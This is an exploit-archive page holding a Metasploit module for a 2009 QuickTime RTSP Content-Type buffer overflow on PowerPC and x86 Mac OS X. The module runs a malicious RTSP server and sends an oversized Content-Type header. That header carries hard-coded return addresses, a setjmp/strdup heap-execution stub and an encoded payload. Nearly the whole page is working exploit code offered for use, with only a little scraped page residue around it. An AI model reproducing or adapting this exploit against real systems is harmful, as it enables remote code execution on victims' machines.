Apple QuickTime RTSP 10.4.0 - 10.5.0 Content-Type Overflow (OS X)
=================================================================


# Title: Apple Quicktime RTSP 10.4.0 - 10.5.0 Content-Type Overflow (OS X)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: n/a
# Published: 2009-10-28
# Verified: yes


view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  include Exploit::Remote::TcpServer
     
  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039; => &#039;MacOS X QuickTime RTSP Content-Type Overflow&#039;,
                      &#039;Platform&#039; => &#039;osx&#039;,
                      &#039;Targets&#039; =>
                      [
                       [ &#039;Mac OS X 10.4.0 PowerPC, QuickTime 7.0.0&#039;, {
                           &#039;Arch&#039; => ARCH_PPC,
                           &#039;Ret&#039; => 0x8fe3f88c,
                           &#039;RetOffset&#039; => 551,
                           &#039;PayloadOffset&#039; => 879
                         }
                       ],
                       [ &#039;Mac OS X 10.5.0 PowerPC, QuickTime 7.2.1&#039;, {
                           &#039;Arch&#039; => ARCH_PPC,
                           &#039;Ret&#039; => 0x8fe042e0,
                           &#039;RetOffset&#039; => 615,
                           &#039;PayloadOffset&#039; => 3351
                         }
                       ],
                       [ &#039;Mac OS X 10.4.8 x86, QuickTime 7.1.3&#039;, {
                           &#039;Arch&#039; => ARCH_X86,
                           &#039;Offset&#039; => 307,
                            
                           &#039;Writable&#039; => 0xa0bd0f10,    # libSystem __IMPORT
                            
                           # The rest of these are all in libSystem __TEXT
                           &#039;ret&#039; => 0x9015d336,
                           &#039;setjmp&#039; => 0x900bc438,
                           &#039;strdup&#039; => 0x90012f40,
                           &#039;jmp_eax&#039; => 0x9014a77f
                         }
                       ],
                       [ &#039;Mac OS X 10.5.0 x86, QuickTime 7.2.1&#039;, {
                           &#039;Arch&#039; => ARCH_X86,
                           &#039;Offset&#039; => 307,
                            
                           &#039;Writable&#039; => 0x8fe66448,  # dyld __IMPORT
                            
                           # The rest of these addresses are in dyld __TEXT
                           &#039;ret&#039; => 0x8fe1ceee,
                           &#039;setjmp&#039; => 0x8fe1ceb0,
                           &#039;strdup&#039; => 0x8fe1cd77,
                           &#039;jmp_eax&#039; => 0x8fe01041
                         }
                       ],
                      ],
                      &#039;DefaultTarget&#039; => 2,
                      &#039;Payload&#039; => {
                        &#039;Space&#039; => 3841,
                        &#039;BadChars&#039; =>
                        "\x00\x0a\x0d",
                        &#039;MaxNops&#039; => 0,
                        &#039;StackAdjustment&#039; => -3500,
                      }
                      ))
  end
   
  ######
   
  # XXX: This does not work on Tiger apparently
  def make_exec_payload_from_heap_stub()
    frag0 =
      "\x90" + # nop
      "\x58" + # pop eax
      "\x61" + # popa
      "\xc3"   # ret
     
    frag1 =
      "\x90" +             # nop
      "\x58" +             # pop eax
      "\x89\xe0" +         # mov eax, esp
      "\x83\xc0\x0c" +     # add eax, byte +0xc
      "\x89\x44\x24\x08" + # mov [esp+0x8], eax
      "\xc3"               # ret
     
    setjmp = target[&#039;setjmp&#039;]
    writable = target[&#039;Writable&#039;]
    strdup = target[&#039;strdup&#039;]
    jmp_eax = target[&#039;jmp_eax&#039;]
     
    exec_payload_from_heap_stub =
      frag0 +
      [setjmp].pack(&#039;V&#039;) +
      [writable + 32, writable].pack("V2") +
      frag1 +
      "X" * 20 +
      [setjmp].pack(&#039;V&#039;) +
      [writable + 24, writable, strdup, jmp_eax].pack("V4") +
      "X" * 4
  end
   
  def on_client_connect(client)
    print_status("Got client connection...")
     
    if (target[&#039;Arch&#039;] == ARCH_PPC)
      ret_offset = target[&#039;RetOffset&#039;]
      payload_offset = target[&#039;PayloadOffset&#039;]
       
      # Create pattern sized up to payload, since it always follows
      # the return address.
      boom = Rex::Text.pattern_create(payload_offset)
       
      boom[ret_offset, 4] = [target[&#039;Ret&#039;]].pack(&#039;N&#039;)
      boom[payload_offset, payload.encoded.length] = payload.encoded
    else
      boom = Rex::Text.pattern_create(327)
       
      boom[307, 4] = [target[&#039;ret&#039;]].pack(&#039;V&#039;)
      boom[311, 4] = [target[&#039;ret&#039;]].pack(&#039;V&#039;)
      boom[319, 4] = [target[&#039;Writable&#039;]].pack(&#039;V&#039;)
      boom[323, 4] = [target[&#039;Writable&#039;]].pack(&#039;V&#039;)
       
      #
      # Create exec-payload-from-heap-stub, but split it in two.
      # The first word must be placed as the overwritten saved ebp
      # in the attack string.  The rest is placed after the
      # Writable memory addresses.
      #
      magic = make_exec_payload_from_heap_stub()
      boom[303, 4] = magic[0, 4]
      boom += magic[4..-1]
       
      #
      # Place the payload immediately after the stub as it expects
      #
      boom += payload.encoded
    end
     
    body = " "
    header =
      "RTSP/1.0 200 OK\r\n"+
      "CSeq: 1\r\n"+
      "Content-Type: #{boom}\r\n"+
      "Content-Length: #{body.length}\r\n\r\n"
   
    print_status("Sending RTSP response...")
    client.put(header + body)
 
    print_status("Sleeping...")
    sleep(1)
 
    print_status("Starting handler...")
    handler(client)
 
    print_status("Closing client...")
    service.close_client(client)
  end
end



